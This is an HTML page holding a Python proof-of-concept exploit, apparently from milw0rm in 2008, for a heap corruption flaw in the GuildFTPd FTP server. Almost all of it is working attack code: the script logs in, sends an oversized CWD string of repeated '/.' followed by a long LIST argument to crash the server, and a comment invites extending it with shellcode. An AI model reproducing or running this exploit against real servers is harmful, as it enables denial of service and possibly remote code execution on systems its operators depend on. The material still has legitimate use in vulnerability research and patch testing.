<html><head><title>GuildFTPd 0.999.8.11/0.999.14 Heap Corruption PoC/DoS Exploit</title></head><pre># GuildFTPd v0.999.8.11/v0.999.14 heap corruption PoC/DoS exploit
# GuildFTPd URL - http://www.guildftpd.com
# cwd/list heap corruption
# overwrite registers in free(): ecx, edi
#
# (x)dmnt 2008
# feel free to do shellcode
# -*- coding: windows-1252 -*-

import socket
import sys, time

evil_cwd = &quot;/.&quot;*124
evil_dir = &quot;X&quot;*100

def help_info():
    print (&quot;Usage: guildd0s &lt;host&gt; &lt;login&gt; &lt;password&gt;\n&quot;)
    print (&quot;Note: anonymous is enought\n&quot;)

def dos_it(hostname, username, passwd):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((hostname, 21))
    except:
        print (&quot;[-] Connection error!&quot;)
        sys.exit(1)
    r=sock.recv(1024)
    print &quot;[+] &quot; + r
    sock.send(&quot;user %s\n&quot; %username)
    r=sock.recv(1024)
    sock.send(&quot;pass %s\n&quot; %passwd)
    r=sock.recv(1024)
    print &quot;[+] Send evil string&quot;
    sock.send(&quot;cwd %s\n&quot; %evil_cwd)
    r=sock.recv(1024)
    sock.send(&quot;list %s\r\n&quot; %evil_dir)
    time.sleep(3)
    sock.close()
    print &quot;[!] Now server d0s'ed/heap corrupted&quot;

print (&quot;\n]GuildFTPd v0.999.8.11/v0.999.14 remote heap corruption PoC/DoS exploit[&quot;)
print (&quot;](x)dmnt 2008[\n\n&quot;)

if len(sys.argv) &lt;&gt; 4:
    help_info()
    sys.exit(1)

else:
    hostname=sys.argv[1]
    username=sys.argv[2]
    passwd=sys.argv[3]
    dos_it(hostname,username,passwd)
    sys.exit(0)

# milw0rm.com [2008-10-12]</pre></html>